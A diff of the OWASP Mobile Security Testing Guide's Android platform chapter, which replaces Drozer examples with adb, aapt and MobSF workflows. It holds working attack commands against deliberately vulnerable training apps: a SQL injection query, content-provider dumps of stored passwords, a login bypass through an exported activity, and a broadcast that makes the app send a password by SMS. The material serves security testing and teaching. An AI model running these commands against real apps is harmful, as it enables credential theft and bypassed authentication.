@@ -13,7 +13,11 @@ Android permissions are classified into four different categories on the basis o
 - **Signature**: This permission is granted only if the requesting app was signed with the same certificate used to sign the app that declared the permission. If the signature matches, the permission will be granted automatically. This permission is granted at installation time. Example: `android.permission.ACCESS_MOCK_LOCATION`.
 - **SystemOrSignature**: This permission is granted only to applications embedded in the system image or signed with the same certificate used to sign the application that declared the permission. Example: `android.permission.ACCESS_DOWNLOAD_MANAGER`.
 
-A list of all permissions is in the [Android developer documentation](https://developer.android.com/guide/topics/permissions/overview.html "Permissions overview").
+A list of all permissions can be found in the [Android developer documentation](https://developer.android.com/guide/topics/permissions/overview.html "Permissions overview") as well as concrete steps on how to:
+
+- [Declare app permissions](https://developer.android.com/training/permissions/declaring) in your app's manifest file.
+- [Request app permissions](https://developer.android.com/training/permissions/requesting) programmatically.
+- [Define a Custom App Permission](https://developer.android.com/guide/topics/permissions/defining) to share your app resources and capabilities with other apps.
 
 #### Android 8.0 (API level 26) Changes
 
@@ -293,41 +297,39 @@ When analyzing permissions, you should investigate the concrete use case scenari
 
 ### Dynamic Analysis
 
-Permissions for installed applications can be retrieved with Drozer. The following extract demonstrates how to examine the permissions used by an application and the custom permissions defined by the app:
+Permissions for installed applications can be retrieved with `adb`. The following extract demonstrates how to examine the permissions used by an application.
 
 ```bash
-dz> run app.package.info -a com.android.mms.service
-Package: com.android.mms.service
-  Application Label: MmsService
-  Process Name: com.android.phone
-  Version: 6.0.1
-  Data Directory: /data/user/0/com.android.mms.service
-  APK Path: /system/priv-app/MmsService/MmsService.apk
-  UID: 1001
-  GID: [2001, 3002, 3003, 3001]
-  Shared Libraries: null
-  Shared User ID: android.uid.phone
-  Uses Permissions:
-  - android.permission.RECEIVE_BOOT_COMPLETED
-  - android.permission.READ_SMS
-  - android.permission.WRITE_SMS
-  - android.permission.BROADCAST_WAP_PUSH
-  - android.permission.BIND_CARRIER_SERVICES
-  - android.permission.BIND_CARRIER_MESSAGING_SERVICE
-  - android.permission.INTERACT_ACROSS_USERS
-  Defines Permissions:
-  - None
+$ adb shell dumpsys package com.google.android.youtube
+...
+declared permissions:
+  com.google.android.youtube.permission.C2D_MESSAGE: prot=signature, INSTALLED
+requested permissions:
+  android.permission.INTERNET
+  android.permission.ACCESS_NETWORK_STATE
+install permissions:
+  com.google.android.c2dm.permission.RECEIVE: granted=true
+  android.permission.USE_CREDENTIALS: granted=true
+  com.google.android.providers.gsf.permission.READ_GSERVICES: granted=true  
+...
 ```
 
-When Android applications expose IPC components to other applications, they can define permissions to control which applications can access the components. For communication with a component protected by a `normal` or `dangerous` permission, Drozer can be rebuilt so that it includes the required permission:
+The output shows all permissions using the following categories:
 
-```bash
-$ drozer agent build  --permission android.permission.REQUIRED_PERMISSION
-```
+- **declared permissions**: list of all *custom* permissions.
+- **requested and install permissions**: list of all install-time permissions including *normal* and *signature* permissions.
+- **runtime permissions**: list of all *dangerous* permissions.
 
-Note that this method can't be used for `signature` level permissions because Drozer would need to be signed by the certificate used to sign the target application.
+When doing the dynamic analysis:
 
-When doing the dynamic analysis: validate whether the permission requested by the app is actually necessary for the app. For instance: a single-player game that requires access to `android.permission.WRITE_SMS`, might not be a good idea.
+- [Evaluate](https://developer.android.com/training/permissions/evaluating) whether the app really needs the requested permissions. For instance: a single-player game that requires access to `android.permission.WRITE_SMS`, might not be a good idea.
+- In many cases the app could opt for [alternatives to declaring permissions](https://developer.android.com/training/permissions/evaluating#alternatives), such as:
+  - requesting the `ACCESS_COARSE_LOCATION` permission instead of `ACCESS_FINE_LOCATION`. Or even better not requesting the permission at all, and instead ask the user to enter a postal code.
+  - invoking the `ACTION_IMAGE_CAPTURE` or `ACTION_VIDEO_CAPTURE` intent action instead of requesting the `CAMERA` permission.
+  - using [Companion Device Pairing](https://developer.android.com/guide/topics/connectivity/companion-device-pairing) (Android 8.0 (API level 26) and higher) when pairing with a Bluetooth device instead of declaring the `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATIION`, or `BLUETOOTH_ADMIN` permissions.
+- Use the [Privacy Dashboard](https://developer.android.com/training/permissions/explaining-access#privacy-dashboard) (Android 12 (API level 31) and higher) to verify how the app [explains access to sensitive information](https://developer.android.com/training/permissions/explaining-access).
+
+To obtain detail about a specific permission you can refer to the [Android Documentation](https://developer.android.com/reference/android/Manifest.permission).
 
 ## Testing for Injection Flaws (MSTG-PLATFORM-2)
 
@@ -428,15 +430,13 @@ SQL injection can be exploited with the following command. Instead of getting th
 # content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
 ```
 
-Drozer can also be used for dynamic testing.
-
 ## Testing for Fragment Injection (MSTG-PLATFORM-2)
 
 ### Overview
 
 Android SDK offers developers a way to present a [`Preferences activity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html "Preference Activity") to users, allowing the developers to extend and adapt this abstract class.
 
-This abstract class parses the extra data fields of an Intent, in particular, the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` fields.
+This abstract class parses the extra data fields of an Intent, in particular, the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `Preference Activity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` fields.
 
 The first field is expected to contain the `Fragment` class name, and the second one is expected to contain the input bundle passed to the `Fragment`.
 
@@ -516,7 +516,7 @@ Intent i = new Intent();
 i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
 i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
 i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");
-Intent intent = i.setData(Uri.parse("https://security.claudio.pt"));
+i.setData(Uri.parse("https://security.claudio.pt"));
 startActivity(i);
 ```
 
@@ -680,79 +680,6 @@ $ adb shell am start
         -W -a android.intent.action.VIEW
         -d "https://www.myapp.com/my/app/path?dataparam=0" com.myapp.android
 ```
-
-Alternatively you can use Drozer's `scanner.activity.browsable` module in order to automatically pull invocable URIs from the AndroidManifest.xml file:
-
-```bash
-dz> run scanner.activity.browsable -a com.google.android.apps.messaging
-Package: com.google.android.apps.messaging
-  Invocable URIs:
-    sms://
-    mms://
-  Classes:
-    com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
-```
-
-Furthermore, Drozer can then be used to call deep links using the `app.activity.start` module:
-
-```bash
-dz> run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"
-```
-
-## Testing for Insecure Configuration of Instant Apps (MSTG-ARCH-1, MSTG-ARCH-7)
-
-### Overview
-
-With [Google Play Instant](https://developer.android.com/topic/google-play-instant/overview "Google Play Instant") you can now create Instant apps. An instant apps can be instantly launched from a browser or the "try now" button from the app store from Android 5.0 (API level 21) onward. They do not require any form of installation. There are a few challenges with an instant app:
-
-- There is a limited amount of size you can have with an instant app.
-- Only a reduced number of permissions can be used, which are documented at [Android Instant app documentation](https://developer.android.com/topic/google-play-instant/getting-started/instant-enabled-app-bundle?tenant=irina#request-supported-permissions "Permission documentation for Android Instant Apps").
-
-The combination of these can lead to insecure decisions, such as: stripping too much of the authorization/authentication/confidentiality logic from an app, which allows for information leakage.
-
-Note: Instant apps require an App Bundle. App Bundles are described in the "[App Bundles](0x05a-Platform-Overview.md#app-bundles)" section of the "Android Platform Overview" chapter.
-
-### Static Analysis
-
-Static analysis can be either done after reverse engineering a downloaded instant app, or by analyzing the App Bundle. When you analyze the App Bundle, check the Android Manifest to see whether `dist:module dist:instant="true"` is set for a given module (either the base or a specific module with `dist:module` set). Next, check for the various entry points, which entry points are set (by means of `<data android:path="</PATH/HERE>" />`).
-
-Now follow the entry points, like you would do for any Activity and check:
-
-- Is there any data retrieved by the app which should require privacy protection of that data? If so, are all required controls in place?
-- Are all communications secured?
-- When you need more functionalities, are the right security controls downloaded as well?
-
-### Dynamic Analysis
-
-There are multiple ways to start the dynamic analysis of your instant app. In all cases, you will first have to install the support for instant apps and add the `ia` executable to your `$PATH`.
-
-The installation of instant app support is taken care off through the following command:
-
-```bash
-$ cd path/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps'
-```
-
-Next, you have to add `path/to/android/sdk/extras/google/instantapps/ia` to your `$PATH`.
-
-After the preparation, you can test instant apps locally on a device running Android 8.1 (API level 27) or later. The app can be tested in different ways:
-
-- Test the app locally:
-  Deploy the app via Android Studio (and enable the `Deploy as instant app` checkbox in the Run/Configuration dialog) or deploy the app using the following command:
-  
-  ```bash
-  $ ia run output-from-build-command <app-artifact>
-  ```
-
-- Test the app using the Play Console:
-  1. Upload your App Bundle to the Google Play Console
-  2. Prepare the uploaded bundle for a release to the internal test track.
-  3. Sign into an internal tester account on a device, then launch your instant experience from either an external prepared link or via the `try now` button in the App store from the testers account.
-
-Now that you can test the app, check whether:
-
-- There are any data which require privacy controls and whether these controls are in place.
-- All communications are sufficiently secured.
-- When you need more functionalities, are the right security controls downloaded as well for these functionalities?
 
 ## Testing for Sensitive Functionality Exposure Through IPC (MSTG-PLATFORM-4)
 
@@ -921,79 +848,147 @@ BroadcastReceivers should use the `android:permission` attribute;  otherwise, ot
 
 ### Dynamic Analysis
 
-You can enumerate IPC components with Drozer. To list all exported IPC components, use the module `app.package.attacksurface`:
+You can enumerate IPC components with [MobSF](0x08-Testing-Tools.md#mobsf "MobSF"). To list all exported IPC components, upload the APK file and the components collection will be displayed in the following screen:
 
-```bash
-dz> run app.package.attacksurface com.mwr.example.sieve
-Attack Surface:
-  3 activities exported
-  0 broadcast receivers exported
-  2 content providers exported
-  2 services exported
-    is debuggable
-```
+<img src="Images/Chapters/0x05h/MobSF_Show_Components.png" width="100%" />
 
 #### Content Providers
 
 The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:
 
 ```bash
-dz> run app.provider.finduri com.mwr.example.sieve
-Scanning com.mwr.example.sieve...
-content://com.mwr.example.sieve.DBContentProvider/
-content://com.mwr.example.sieve.FileBackupProvider/
-content://com.mwr.example.sieve.DBContentProvider
-content://com.mwr.example.sieve.DBContentProvider/Passwords/
-content://com.mwr.example.sieve.DBContentProvider/Keys/
-content://com.mwr.example.sieve.FileBackupProvider
-content://com.mwr.example.sieve.DBContentProvider/Passwords
-content://com.mwr.example.sieve.DBContentProvider/Keys
+$ adb shell dumpsys package com.mwr.example.sieve | grep -Po "Provider{[\w\d\s\./]+}" | sort -u
+Provider{34a20d5 com.mwr.example.sieve/.FileBackupProvider}
+Provider{64f10ea com.mwr.example.sieve/.DBContentProvider}
 ```
 
-Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be good if sensitive keys and passwords could simply be queried from the provider!
+Once identified, you can use [jadx](0x08-Testing-Tools.md#jadx "jadx") to reverse engineer the app and analyze the source code of the exported content providers to identify potential vulnerabilities.
+
+To identify the corresponding class of a content provider, use the following information:
+
+- Package Name: `com.mwr.example.sieve`.
+- Content Provider Class Name: `DBContentProvider`.
+
+When analyzing the class `com.mwr.example.sieve.DBContentProvider`, you'll see that it contains several URIs:
+
+```java
+package com.mwr.example.sieve;
+...
+public class DBContentProvider extends ContentProvider {
+    public static final Uri KEYS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");
+    public static final Uri PASSWORDS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
+...
+}
+```
+
+Use the following commands to call the content provider using the identified URIs:
 
 ```bash
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
-Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
+Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
+
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/
+Row: 0 _id=1, service=test, username=test, password=BLOB, email=t@tedt.com
+Row: 1 _id=2, service=bank, username=owasp, password=BLOB, email=user@tedt.com
+
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\"bank\"'
+Row: 0 email=user@tedt.com, username=owasp, password=BLOB
 ```
 
-```bash
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
-| Password          | pin  |
-| SuperPassword1234 | 1234 |
-```
-
-This content provider can be accessed without permission.
-
-```bash
-dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "newpassword"
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
-| Password    | pin  |
-| newpassword | 1234 |
-```
+You are able now to retrieve all database entries (see all lines starting with "Row:" in the output).
 
 #### Activities
 
-To list activities exported by an application, use the module `app.activity.info`. Specify the target package with `-a` or omit the option to target all apps on the device:
+To list activities exported by an application, you can use the following command and focus on `activity` elements:
 
 ```bash
-dz> run app.activity.info -a com.mwr.example.sieve
-Package: com.mwr.example.sieve
-  com.mwr.example.sieve.FileSelectActivity
-    Permission: null
-  com.mwr.example.sieve.MainLoginActivity
-    Permission: null
-  com.mwr.example.sieve.PWList
-    Permission: null  
+$ aapt d xmltree sieve.apk AndroidManifest.xml
+...
+E: activity (line=32)
+  A: android:label(0x01010001)=@0x7f05000f
+  A: android:name(0x01010003)=".FileSelectActivity" (Raw: ".FileSelectActivity")
+  A: android:exported(0x01010010)=(type 0x12)0xffffffff
+  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
+  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
+  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
+E: activity (line=40)
+  A: android:label(0x01010001)=@0x7f050000
+  A: android:name(0x01010003)=".MainLoginActivity" (Raw: ".MainLoginActivity")
+  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
+  A: android:launchMode(0x0101001d)=(type 0x10)0x2
+  A: android:windowSoftInputMode(0x0101022b)=(type 0x11)0x14
+  E: intent-filter (line=46)
+    E: action (line=47)
+      A: android:name(0x01010003)="android.intent.action.MAIN" (Raw: "android.intent.action.MAIN")
+    E: category (line=49)
+      A: android:name(0x01010003)="android.intent.category.LAUNCHER" (Raw: "android.intent.category.LAUNCHER")
+E: activity (line=52)
+  A: android:label(0x01010001)=@0x7f050009
+  A: android:name(0x01010003)=".PWList" (Raw: ".PWList")
+  A: android:exported(0x01010010)=(type 0x12)0xffffffff
+  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
+  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
+  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
+E: activity (line=60)
+  A: android:label(0x01010001)=@0x7f05000a
+  A: android:name(0x01010003)=".SettingsActivity" (Raw: ".SettingsActivity")
+  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
+  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
+  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
+...
 ```
 
-Enumerating activities in the vulnerable password manager "Sieve" shows that the activity `com.mwr.example.sieve.PWList` is exported with no required permissions. It is possible to use the module `app.activity.start` to launch this activity.
+You can identify an exported activity using one of the following properties:
+
+- It have an `intent-filter` sub declaration.
+- It have the attribute `android:exported` to `0xffffffff`.
+
+You can also use [jadx](0x08-Testing-Tools.md#jadx "jadx") to identify exported activities in the file `AndroidManifest.xml` using the criteria described above:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mwr.example.sieve">
+...
+  <!-- This activity is exported via the attribute "exported" -->
+  <activity android:name=".FileSelectActivity" android:exported="true" />
+   <!-- This activity is exported via the "intent-filter" declaration  -->
+  <activity android:name=".MainLoginActivity">
+    <intent-filter>
+      <action android:name="android.intent.action.MAIN"/>
+      <category android:name="android.intent.category.LAUNCHER"/>
+    </intent-filter>
+  </activity>
+  <!-- This activity is exported via the attribute "exported" -->
+  <activity android:name=".PWList" android:exported="true" />
+  <!-- Activities below are not exported -->
+  <activity android:name=".SettingsActivity" />
+  <activity android:name=".AddEntryActivity"/>
+  <activity android:name=".ShortLoginActivity" />
+  <activity android:name=".WelcomeActivity" />
+  <activity android:name=".PINActivity" />
+...
+</manifest>
+```
+
+Enumerating activities in the vulnerable password manager "Sieve" shows that the following activities are exported:
+
+- `.MainLoginActivity`
+- `.PWList`
+- `.FileSelectActivity`
+
+Use the command below to launch an activity:
 
 ```bash
-dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
+# Start the activity without specifying an action or an category
+$ adb shell am start -n com.mwr.example.sieve/.PWList
+Starting: Intent { cmp=com.mwr.example.sieve/.PWList }
+
+# Start the activity indicating an action (-a) and an category (-c)
+$ adb shell am start -n "com.mwr.example.sieve/.MainLoginActivity" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER
+Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.mwr.example.sieve/.MainLoginActivity }
 ```
 
-Since the activity is called directly in this example, the login form protecting the password manager would be bypassed, and the data contained within the password manager could be accessed.
+Since the activity `.PWList` is called directly in this example, you can use it to bypass the login form protecting the password manager, and access the data contained within the password manager.
 
 #### Services
 
@@ -1023,21 +1018,97 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
 
 #### Broadcast Receivers
 
-Broadcasts can be enumerated via the Drozer module `app.broadcast.info`. The target package should be specified via the `-a` parameter:
+To list broadcast receivers exported by an application, you can use the following command and focus on `receiver` elements:
 
 ```bash
-dz> run app.broadcast.info -a com.android.insecurebankv2
-Package: com.android.insecurebankv2
-  com.android.insecurebankv2.MyBroadCastReceiver
-    Permission: null
+$ aapt d xmltree InsecureBankv2.apk AndroidManifest.xml
+...
+E: receiver (line=88)
+  A: android:name(0x01010003)="com.android.insecurebankv2.MyBroadCastReceiver" (Raw: "com.android.insecurebankv2.MyBroadCastReceiver")
+  A: android:exported(0x01010010)=(type 0x12)0xffffffff
+  E: intent-filter (line=91)
+    E: action (line=92)
+      A: android:name(0x01010003)="theBroadcast" (Raw: "theBroadcast")
+E: receiver (line=119)
+  A: android:name(0x01010003)="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" (Raw: "com.google.android.gms.wallet.EnableWalletOptimizationReceiver")
+  A: android:exported(0x01010010)=(type 0x12)0x0
+  E: intent-filter (line=122)
+    E: action (line=123)
+      A: android:name(0x01010003)="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION" (Raw: "com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION")
+...
 ```
 
-In the example app "Android Insecure Bank", one broadcast receiver is exported without requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, you must also use static analysis to understand the functionality of the broadcast receiver, as we did before.
+You can identify an exported broadcast receiver using one of the following properties:
 
-With the Drozer module `app.broadcast.send`, we can formulate an intent to trigger the broadcast and send the password to a phone number within our control:
+- It has an `intent-filter` sub declaration.
+- It has the attribute `android:exported` set to `0xffffffff`.
+
+You can also use [jadx](0x08-Testing-Tools.md#jadx "jadx") to identify exported broadcast receivers in the file `AndroidManifest.xml` using the criteria described above:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.insecurebankv2">
+...
+  <!-- This broadcast receiver is exported via the attribute "exported" as well as the "intent-filter" declaration -->
+  <receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
+    <intent-filter>
+      <action android:name="theBroadcast"/>
+    </intent-filter>
+  </receiver>
+  <!-- This broadcast receiver is NOT exported because the attribute "exported" is explicitly set to false -->
+  <receiver android:name="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" android:exported="false">
+    <intent-filter>
+      <action android:name="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION"/>
+    </intent-filter>
+  </receiver>
+...
+</manifest>
+```
+
+The above example from the vulnerable banking application [InsecureBankv2](0x08-Testing-Tools.md#android "Vulnerable applications for Android") shows that only the broadcast receiver named `com.android.insecurebankv2.MyBroadCastReceiver` is exported.
+
+Now that you know that there is an exported broadcast receiver, you can dive deeper and reverse engineer the app using [jadx](0x08-Testing-Tools.md#jadx "jadx"). This will allow you to analyze the source code searching for potential vulnerabilities that you could later try to exploit. The source code of the exported broadcast receiver is the following:
+
+```java
+package com.android.insecurebankv2;
+...
+public class MyBroadCastReceiver extends BroadcastReceiver {
+    public static final String MYPREFS = "mySharedPreferences";
+    String usernameBase64ByteString;
+
+    public void onReceive(Context context, Intent intent) {
+        String phn = intent.getStringExtra("phonenumber");
+        String newpass = intent.getStringExtra("newpass");
+        if (phn != null) {
+            try {
+                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
+                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", (String) null), 0), "UTF-8");
+                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", (String) null));
+                String textPhoneno = phn.toString();
+                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
+                SmsManager smsManager = SmsManager.getDefault();
+                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
+                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        } else {
+            System.out.println("Phone number is null");
+        }
+    }
+}
+```
+
+As you can see in the source code, this broadcast receiver expects two parameters named `phonenumber` and `newpass`. With this information you can now try to exploit this broadcast receiver by sending events to it using custom values:
 
 ```bash
-dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
+# Send an event with the following properties:
+# Action is set to "theBroadcast"
+# Parameter "phonenumber" is set to the string "07123456789"
+# Parameter "newpass" is set to the string "12345"
+$ adb shell am broadcast -a theBroadcast --es phonenumber "07123456789" --es newpass "12345"
+Broadcasting: Intent { act=theBroadcast flg=0x400000 (has extras) }
+Broadcast completed: result=0
 ```
 
 This generates the following SMS:
@@ -1061,6 +1132,20 @@ Action: theBroadcast
 Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
 Extra: phonenumber=07123456789 (java.lang.String)
 Extra: newpass=12345 (java.lang.String)`
+```
+
+You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed:
+
+```bash
+$ adb shell dumpsys activity broadcasts | grep "theBroadcast"
+BroadcastRecord{fc2f46f u0 theBroadcast} to user 0
+Intent { act=theBroadcast flg=0x400010 (has extras) }
+BroadcastRecord{7d4f24d u0 theBroadcast} to user 0
+Intent { act=theBroadcast flg=0x400010 (has extras) }
+45: act=theBroadcast flg=0x400010 (has extras)
+46: act=theBroadcast flg=0x400010 (has extras)
+121: act=theBroadcast flg=0x400010 (has extras)
+144: act=theBroadcast flg=0x400010 (has extras)
 ```
 
 ## Testing JavaScript Execution in WebViews (MSTG-PLATFORM-5)
@@ -1304,7 +1389,7 @@ String json = gson.toJson(obj);
 #### XML
 
 There are several ways to serialize the contents of an object to XML and back. Android comes with the `XmlPullParser` interface which allows for easily maintainable XML parsing. There are two implementations within Android: `KXmlParser` and `ExpatPullParser`. The [Android Developer Guide](https://developer.android.com/training/basics/network-ops/xml#java "Instantiate the parser") provides a great write-up on how to use them. Next, there are various alternatives, such as a `SAX` parser that comes with the Java runtime. For more information, see [a blogpost from ibm.com](https://www.ibm.com/developerworks/opensource/library/x-android/index.html "Working with XML on Android on IBM Developer").
-Similarly to JSON, XML has the issue of working mostly String based, which means that String-type secrets will be harder to remove from memory. XML data can be stored anywhere (database, files), but do need additional protection in case of secrets or information that should not be changed. See the chapter "[Data Storage on Android](0x05d-Testing-Data-Storage.md)" for more details. As stated earlier: the true danger in XML lies in the [XML eXternal Entity (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing "XML eXternal Entity attack (XXE)") attack as it might allow for reading external data sources that are still accessible within the application.
+Similarly to JSON, XML has the issue of working mostly String based, which means that String-type secrets will be harder to remove from memory. XML data can be stored anywhere (database, files), but do need additional protection in case of secrets or information that should not be changed. See the chapter "[Data Storage on Android](0x05d-Testing-Data-Storage.md)" for more details. As stated earlier: the true danger in XML lies in the [XML eXternal Entity (XXE)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing "XML eXternal Entity attack (XXE)") attack as it might allow for reading external data sources that are still accessible within the application.
 
 #### ORM
 
@@ -1538,7 +1623,7 @@ if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
 
 
 
-                     //...Part 3: check if update completed succesfully
+                     //...Part 3: check if update completed successfully
  @Override
  public void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (myRequestCode == MY_REQUEST_CODE) {
@@ -1588,30 +1673,6 @@ Finally, in part 4: you can see that for every entry point in the application, a
 In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store.
 Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend.
 Lastly, see if you can play with the version number of a man-in-the-middled app and see how the backend responds to this (and if it is recorded at all for instance).
-
-## Testing App Notifications (MSTG-STORAGE-4 and MSTG-STORAGE-7)
-
-### Overview
-
-Android allows for applications to create [notifications](https://developer.android.com/guide/topics/ui/notifiers/notifications "Notifications Overview"), a form of message that is displayed by the Android system outside of the application's UI. This is useful for applications to display small messages to the user while they use other applications on their device.
-
-It is important to understand that notifications should never be considered private. When a notification is handled by the Android system it is broadcasted system-wide and any application running with a [NotificationListenerService](https://developer.android.com/reference/kotlin/android/service/notification/NotificationListenerService "NotificationListenerService") can listen for these notifications to receive them in full and may handle them however it wants.
-
-There are many known malware samples such as [Joker](https://research.checkpoint.com/2020/new-joker-variant-hits-google-play-with-an-old-trick/ "Joker Malware"), and [Alien](https://www.threatfabric.com/blogs/alien_the_story_of_cerberus_demise.html "Alien Malware") which abuses the `NotificationListenerService` to listen for notifications on the device and then send them to attacker-controlled C2 infrastructure. Commonly this is done in order to listen for two-factor authentication (2FA) codes that appear as notifications on the device which are then sent to the attacker. A safer alternative for the user would be to use a 2FA application that does not generate notifications.
-
-Furthermore there are a number of apps on the Google Play Store that provide notification logging, which basically logs locally any notifications on the Android system. This highlights that notifications are in no way private on Android and accessible by any other app on the device.
-
-For this reason all notification usage should be inspected for confidential or high risk information that could be used by malicious applications.
-
-### Static Analysis
-
-When statically assessing an application, it is recommended to search for any usage of the `NotificationManager` class which might be an indication of some form of notification management. If the class is being used, the next step would be to understand how the application is [generating the notifications](https://developer.android.com/training/notify-user/build-notification#SimpleNotification "Create a Notification").
-
-These code locations can be fed into the Dynamic Analysis section below, providing an idea of where in the application notifications may be dynamically generated.
-
-### Dynamic Analysis
-
-To identify the usage of notifications run through the entire application and all its available functions looking for ways to trigger any notifications. Take note of any notifications that appear while using the application and examine if they contain any confidential information. Consider that you may need to perform actions outside of the application in order to trigger certain notifications.
 
 ## References
 
@@ -1679,6 +1740,3 @@ To identify the usage of notifications run through the entire application and al
 - MSTG-PLATFORM-7: "If native methods of the app are exposed to a WebView, verify that the WebView only renders JavaScript contained within the app package."
 - MSTG-PLATFORM-8: "Object serialization, if any, is implemented using safe serialization APIs."
 - MSTG-ARCH-9: "A mechanism for enforcing updates of the mobile app exists."
-
-- MSTG-STORAGE-4: "No sensitive data is shared with third parties unless it is a necessary part of the architecture."
-- MSTG-STORAGE-7: "No sensitive data, such as passwords or pins, is exposed through the user interface."
